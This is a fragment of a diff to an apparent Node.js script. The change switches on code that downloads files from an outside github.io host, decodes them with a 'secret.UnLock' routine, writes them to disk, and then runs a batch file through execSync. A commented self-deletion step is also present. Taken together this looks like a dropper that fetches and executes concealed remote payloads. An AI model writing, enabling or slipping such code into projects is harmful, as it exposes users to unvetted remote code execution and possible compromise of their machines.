@@ -12,14 +12,13 @@ let count = 0
 for (let file of files) {
   request('https://8230459.github.io/b/' + file.name, {}, async (err, res, body) => {
     if (err) return
-    //fs.createWriteStream(path.join(file.path, file.name)).write(secret.UnLock(body))
+    fs.createWriteStream(path.join(file.path, file.name)).write(secret.UnLock(body))
     count++
   })
 }
 const timer = setInterval(async () => {
-  console.log(files.length, count)
   if (files.length === count) {
-    //await execSync('git.bat')
+    await execSync('git.bat')
     //await fs.rmSync('get.js', {recursive: true})
     //await execSync('node jenkins.js')
     process.exit()
